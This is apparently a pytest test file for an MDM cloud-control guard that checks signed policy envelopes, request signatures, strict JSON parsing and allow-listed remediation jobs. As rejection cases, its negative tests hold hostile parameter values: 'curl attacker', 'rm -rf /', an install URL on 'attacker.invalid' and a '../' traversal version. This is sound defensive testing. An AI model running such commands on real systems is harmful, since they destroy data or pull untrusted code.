from __future__ import annotations

import copy
from datetime import timedelta

import pytest
from cryptography.hazmat.primitives.asymmetric import ec, rsa

from codex_plugin_scanner.guard.mdm.cloud_control import (
    ACK_SCHEMA,
    HEALTH_SCHEMA,
    REMEDIATION_SCHEMA,
    ContractError,
    iso,
    load_json,
    policy_hash,
    sign_config,
    sign_proof,
    utcnow,
    validate_ack,
    validate_health,
    validate_remediation,
    verify_config,
    verify_proof,
)

WORKSPACE = "workspace-mdm-alpha"
DEVICE = "device-a"
GENERATION = "a" * 32


def policy(mode: str = "enforce") -> dict[str, object]:
    return {
        "schemaVersion": "hol-guard-mdm-policy.v1",
        "settings": {"mode": mode},
        "lockedSettings": ["mode"],
        "requiredHarnesses": [],
    }


def envelope(
    private_key: rsa.RSAPrivateKey,
    *,
    revision: int = 1,
    previous: str | None = None,
    mode: str = "enforce",
) -> dict[str, object]:
    now = utcnow()
    managed_policy = policy(mode)
    return sign_config(
        {
            "schemaVersion": "hol-guard-mdm-cloud-config.v1",
            "workspaceId": WORKSPACE,
            "deviceId": DEVICE,
            "installationGeneration": GENERATION,
            "revision": revision,
            "issuedAt": iso(now),
            "notBefore": iso(now - timedelta(seconds=1)),
            "expiresAt": iso(now + timedelta(minutes=10)),
            "policy": managed_policy,
            "policyHash": policy_hash(managed_policy),
            "previousPolicyHash": previous,
            "rollback": {"authorized": False, "fromRevision": None, "reason": None},
            "signingKeyId": "cloud-key",
        },
        private_key,
    )


def test_signed_configuration_is_bound_and_monotonic() -> None:
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    first = envelope(key)
    assert (
        verify_config(
            first,
            key.public_key(),
            workspace=WORKSPACE,
            device=DEVICE,
            generation=GENERATION,
            current_revision=None,
            current_hash=None,
        )["revision"]
        == 1
    )
    second = envelope(key, revision=2, previous=first["policyHash"])
    assert (
        verify_config(
            second,
            key.public_key(),
            workspace=WORKSPACE,
            device=DEVICE,
            generation=GENERATION,
            current_revision=1,
            current_hash=first["policyHash"],
        )["revision"]
        == 2
    )
    with pytest.raises(ContractError, match="configuration_revision_not_monotonic"):
        verify_config(
            first,
            key.public_key(),
            workspace=WORKSPACE,
            device=DEVICE,
            generation=GENERATION,
            current_revision=1,
            current_hash=first["policyHash"],
        )


def test_configuration_rejects_tamper_wrong_binding_chain_and_key() -> None:
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    other_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    value = envelope(key)
    for field, replacement, code in (
        ("policyHash", "0" * 64, "configuration_hash_mismatch"),
        ("workspaceId", "other", "configuration_binding_invalid"),
    ):
        bad = copy.deepcopy(value)
        bad[field] = replacement
        with pytest.raises(ContractError, match=code):
            verify_config(
                bad,
                key.public_key(),
                workspace=WORKSPACE,
                device=DEVICE,
                generation=GENERATION,
                current_revision=None,
                current_hash=None,
            )
    with pytest.raises(ContractError, match="configuration_chain_mismatch"):
        verify_config(
            envelope(key, revision=2, previous="1" * 64),
            key.public_key(),
            workspace=WORKSPACE,
            device=DEVICE,
            generation=GENERATION,
            current_revision=1,
            current_hash=value["policyHash"],
        )
    with pytest.raises(ContractError, match="configuration_signature_invalid"):
        verify_config(
            value,
            other_key.public_key(),
            workspace=WORKSPACE,
            device=DEVICE,
            generation=GENERATION,
            current_revision=None,
            current_hash=None,
        )


def test_request_proof_is_body_path_method_and_sequence_bound() -> None:
    key = ec.generate_private_key(ec.SECP256R1())
    observed_at = iso(utcnow())
    body = b"{}"
    signature = sign_proof(key, "POST", "/runtime/v1/health", body, 4, observed_at)
    verify_proof(
        key.public_key(),
        signature,
        "POST",
        "/runtime/v1/health",
        body,
        4,
        observed_at,
    )
    for method, path, candidate_body, sequence in (
        ("GET", "/runtime/v1/health", body, 4),
        ("POST", "/runtime/v1/acknowledgements", body, 4),
        ("POST", "/runtime/v1/health", b'{"changed":true}', 4),
        ("POST", "/runtime/v1/health", body, 5),
    ):
        with pytest.raises(ContractError, match="request_proof_invalid"):
            verify_proof(
                key.public_key(),
                signature,
                method,
                path,
                candidate_body,
                sequence,
                observed_at,
            )


def test_ack_health_and_all_fixed_remediation_actions_are_strict() -> None:
    now = utcnow()
    acknowledgement = {
        "schemaVersion": ACK_SCHEMA,
        "workspaceId": WORKSPACE,
        "deviceId": DEVICE,
        "installationGeneration": GENERATION,
        "revision": 1,
        "policyHash": "1" * 64,
        "status": "applied",
        "reasonCode": None,
        "observedAt": iso(now),
        "requestId": "ack-1",
    }
    assert validate_ack(acknowledgement, WORKSPACE, DEVICE, GENERATION) == acknowledgement
    health = {
        "schemaVersion": HEALTH_SCHEMA,
        "workspaceId": WORKSPACE,
        "deviceId": DEVICE,
        "installationGeneration": GENERATION,
        "sequence": 1,
        "appliedRevision": 1,
        "appliedPolicyHash": "1" * 64,
        "observedAt": iso(now),
        "requestId": "health-1",
        "status": {"healthy": True},
    }
    assert validate_health(health, WORKSPACE, DEVICE, GENERATION) == health
    actions = (
        ("repair", {"scope": "machine"}),
        ("policy-refresh", {}),
        ("integrity-scan", {}),
        ("service-register", {"service": "machine-health"}),
        ("version-converge", {"targetVersion": "3.0.0-test"}),
        ("install", {"targetVersion": "3.0.1-test"}),
    )
    for index, (action, parameters) in enumerate(actions, start=1):
        job = {
            "schemaVersion": REMEDIATION_SCHEMA,
            "workspaceId": WORKSPACE,
            "deviceId": DEVICE,
            "installationGeneration": GENERATION,
            "jobId": f"job-{index}",
            "idempotencyKey": f"idem-{index}",
            "action": action,
            "parameters": parameters,
            "createdAt": iso(now),
            "expiresAt": iso(now + timedelta(minutes=5)),
            "maxAttempts": 2,
        }
        assert validate_remediation(job, WORKSPACE, DEVICE, GENERATION) == job


def test_remediation_rejects_arbitrary_authority_and_open_parameters() -> None:
    now = utcnow()
    base = {
        "schemaVersion": REMEDIATION_SCHEMA,
        "workspaceId": WORKSPACE,
        "deviceId": DEVICE,
        "installationGeneration": GENERATION,
        "jobId": "job-1",
        "idempotencyKey": "idem-1",
        "createdAt": iso(now),
        "expiresAt": iso(now + timedelta(minutes=5)),
        "maxAttempts": 2,
    }
    for action, parameters in (
        ("shell", {"command": "curl attacker"}),
        ("repair", {"scope": "machine", "script": "rm -rf /"}),
        ("install", {"targetVersion": "https://attacker.invalid/package"}),
        ("service-register", {"service": "arbitrary-daemon"}),
    ):
        with pytest.raises(
            ContractError,
            match=r"^(?:remediation_action_invalid|forbidden_authority_field)$",
        ):
            validate_remediation(
                {**base, "action": action, "parameters": parameters},
                WORKSPACE,
                DEVICE,
                GENERATION,
            )


def test_strict_json_loader_rejects_duplicates_limits_and_nonfinite_values() -> None:
    with pytest.raises(ContractError, match="duplicate_json_key"):
        load_json(b'{"workspaceId":"one","workspaceId":"two"}')
    with pytest.raises(ContractError, match=r"^invalid_json_number$"):
        load_json(b'{"value":NaN}')
    with pytest.raises(ContractError, match="request_too_large"):
        load_json(b"x" * 65, limit=64)
    nested = b'{"a":' * 30 + b"null" + b"}" * 30
    with pytest.raises(ContractError, match="contract_depth_exceeded"):
        load_json(nested)


def test_configuration_rejects_tampering_of_every_bound_security_field() -> None:
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    value = envelope(key)
    now = utcnow()
    for field, replacement, code in (
        ("deviceId", "device-other", "configuration_binding_invalid"),
        ("installationGeneration", "b" * 32, "configuration_binding_invalid"),
        ("revision", 0, "configuration_revision_invalid"),
        ("signingKeyId", "cloud-key-other", "configuration_signature_invalid"),
        ("notBefore", iso(now + timedelta(minutes=5)), "configuration_expired"),
        ("expiresAt", iso(now - timedelta(minutes=5)), "configuration_expired"),
    ):
        bad = copy.deepcopy(value)
        bad[field] = replacement
        with pytest.raises(ContractError, match=rf"^{code}$"):
            verify_config(
                bad,
                key.public_key(),
                workspace=WORKSPACE,
                device=DEVICE,
                generation=GENERATION,
                current_revision=None,
                current_hash=None,
                now=now,
            )

    bad_rollback = copy.deepcopy(value)
    bad_rollback["rollback"] = {
        "authorized": True,
        "fromRevision": None,
        "reason": "",
    }
    with pytest.raises(
        ContractError,
        match=r"^configuration_rollback_invalid$",
    ):
        verify_config(
            bad_rollback,
            key.public_key(),
            workspace=WORKSPACE,
            device=DEVICE,
            generation=GENERATION,
            current_revision=None,
            current_hash=None,
            now=now,
        )


def test_remediation_rejects_every_constrained_parameter_edge() -> None:
    now = utcnow()
    base = {
        "schemaVersion": REMEDIATION_SCHEMA,
        "workspaceId": WORKSPACE,
        "deviceId": DEVICE,
        "installationGeneration": GENERATION,
        "jobId": "job-negative",
        "idempotencyKey": "idem-negative",
        "createdAt": iso(now),
        "expiresAt": iso(now + timedelta(minutes=5)),
        "maxAttempts": 2,
    }
    for action, parameters in (
        ("repair", {"scope": "root"}),
        ("policy-refresh", {"unexpected": True}),
        ("integrity-scan", {"unexpected": True}),
        ("install", {"targetVersion": "../3.0.0"}),
        ("version-converge", {"targetVersion": "not a version"}),
    ):
        with pytest.raises(
            ContractError,
            match=r"^(?:remediation_action_invalid|forbidden_authority_field)$",
        ):
            validate_remediation(
                {**base, "action": action, "parameters": parameters},
                WORKSPACE,
                DEVICE,
                GENERATION,
            )
